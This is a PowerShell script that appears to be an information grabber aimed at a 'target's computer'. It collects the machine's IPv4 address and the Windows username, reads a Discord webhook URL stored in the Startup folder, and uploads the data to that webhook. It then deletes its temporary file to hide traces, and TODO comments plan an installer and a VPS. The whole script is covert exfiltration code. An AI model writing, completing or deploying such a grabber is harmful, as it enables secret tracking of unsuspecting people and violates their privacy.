# None of the files created will be saved on the target's computer
# TODO: Need to implement VPS, Fix textfile format, Make the DiscordWebhook in Installer instead

# Get IPv4 address of the machine
$IPAddress = Get-NetIPAddress |
    Where-Object { $_.AddressFamily -eq "IPv4" -and ($_.InterfaceAlias -match "Wi-Fi|Wireless|Ethernet|Local Area Connection") } |
    Select-Object -ExpandProperty IPAddress

if ($IPAddress -eq $null) {
    $ipAddressString = "IPv4 Address"
    # Uncomment the following line when using older versions of Windows without IPv6 support
    # $ipAddressString = "IP Address"
    Write-Host "Network Connection Test"
    $ipconfigOutput = ipconfig
    $ipv4Address = $ipconfigOutput | Select-String -Pattern $ipAddressString | ForEach-Object { $_.ToString() -split ':' } | ForEach-Object { $_.Trim() } | Select-Object -Last 1
    Write-Host "Your IP Address is: $ipv4Address"
    $IPAddress = $ipv4Address
} else {
    Write-Host "IPv4 Address: $IPAddress"
}

# Get the current user's username
$Username = $env:USERNAME

# Get the user's profile folder
$UserProfileFolder = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
$StartupDirectory = "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

# Define the path to the file containing the Discord webhook URL
$DiscordWebhookURLFile = Join-Path -Path $UserProfileFolder -ChildPath "$StartupDirectory\DiscordWebhookURL.icu"
# Use Get-Content to read the file and store its content in a variable
$DiscordWebhookURL = Get-Content -Path $DiscordWebhookURLFile

# Create a text file in the user's startup folder
$TextContent = "$IPAddress`n$Username"
$TextFile = Join-Path -Path $UserProfileFolder -ChildPath "$StartupDirectory$Username.icu"
$TextContent | Out-File -FilePath $TextFile

# Define a message (commented out for now)
# $Message = "Message Placeholder"

# Create a multipart form-data payload
$Boundary = [System.Guid]::NewGuid().ToString()
$CRLF = "`r`n"
$Payload = "--$Boundary$CRLF" +
    "Content-Disposition: form-data; name=`"content`"$CRLF$CRLF$Message$CRLF" +
    "--$Boundary$CRLF" +
    "Content-Disposition: form-data; name=`"file`"; filename=`"$Username.txt`"$CRLF" +
    "Content-Type: application/octet-stream$CRLF$CRLF" +
    (Get-Content -Path $TextFile) + $CRLF +
    "--$Boundary--"
# Set the headers for the request
$Headers = @{
    "Content-Type" = "multipart/form-data; boundary=$Boundary"
}

# Send the payload to Discord
Invoke-RestMethod -Uri $DiscordWebhookURL -Method "POST" -Headers $Headers -Body $Payload

# Delete the text file
Remove-Item -Path $TextFile